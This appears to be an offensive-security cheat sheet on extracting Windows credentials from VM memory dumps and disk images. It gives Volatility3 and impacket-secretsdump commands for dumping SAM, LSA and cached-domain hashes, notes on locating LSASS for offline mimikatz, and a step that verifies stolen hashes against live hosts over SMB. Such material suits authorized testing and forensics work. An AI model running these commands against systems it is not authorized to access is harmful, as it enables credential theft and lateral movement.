# Memory & Disk Forensics (Offline Credential Extraction)

VM backups and crash dumps are **offline credential stores**: a `.vmem` is
raw RAM, `.vmsn` saved state, `.vhd/.vhdx` a full disk. You often don't need
a live shell -- just read the backup.

## Volatility3 setup
```bash
# One-time install (pipx may be absent on Kali)
python3 -m venv /tmp/vol3env && /tmp/vol3env/bin/pip install volatility3
alias vol='/tmp/vol3env/bin/vol'
```
Symbols auto-download from Microsoft Symbol Server on first use. First run
against a new Windows build is slow (PDB download + ISF conversion).

## Registry hive extraction (SAM/SYSTEM/SECURITY -> hashes)
```bash
# List loaded hives and their offsets
vol -f image.vmem windows.registry.hivelist.HiveList

# Dump hives to files (offsets are per-image -- read from YOUR hivelist)
vol -f image.vmem -o /workspace/loot/ windows.registry.hivelist.HiveList --dump

# Extract hashes from dumped hives
impacket-secretsdump \
  -sam /workspace/loot/registry.SAM.<offset>.hive \
  -system /workspace/loot/registry.SYSTEM.<offset>.hive \
  -security /workspace/loot/registry.SECURITY.<offset>.hive LOCAL
# Output: Administrator:500:LM:NTLM:::
```

## Direct credential plugins
```bash
# SAM hashes (simpler, no manual hive export)
vol -f image.vmem windows.hashdump.Hashdump

# LSA secrets
vol -f image.vmem windows.registry.lsadump.Lsadump

# Cached domain credentials
vol -f image.vmem windows.registry.cachedump.Cachedump
```

## Process and memory analysis
```bash
# Process listing
vol -f image.vmem windows.pslist.PsList
vol -f image.vmem windows.pstree.PsTree

# Look for LSASS PID, then dump its memory for mimikatz offline
vol -f image.vmem windows.pslist.PsList | grep lsass

# Injected code detection
vol -f image.vmem windows.malware.malfind.Malfind

# Command history
vol -f image.vmem windows.cmdline.CmdLine

# Network connections
vol -f image.vmem windows.netscan.NetScan
```

## Disk image analysis
For `.vhd/.vhdx` disk images:
```bash
# Mount the VHD (requires libguestfs)
guestmount -a image.vhdx -i --ro /mnt/disk
# OR: mount read-only
vhdimount image.vhd /tmp/vhd && mount -o ro /tmp/vhd/vhdi1 /mnt/disk

# Extract hashes from offline hives
impacket-secretsdump \
  -sam /mnt/disk/Windows/System32/config/SAM \
  -system /mnt/disk/Windows/System32/config/SYSTEM \
  -security /mnt/disk/Windows/System32/config/SECURITY LOCAL

# OR use chntpw to read SAM
chntpw -l /mnt/disk/Windows/System32/config/SAM
```

## Rules
- Hive **offsets are per-image** -- read them from *your* `hivelist` output,
  never hardcode another box's offsets.
- Big images: download in a **background tmux** session with progress logged.
  SMB over VPN can be ~30 MB/min; a 2 GB vmem takes ~60 min.
- Always verify extracted hashes with `nxc smb -H` before building on them.
- If volatility3 symbols fail to download, try `--clear-cache` or manually
  place ISF JSON files in `~/.cache/volatility3/`.
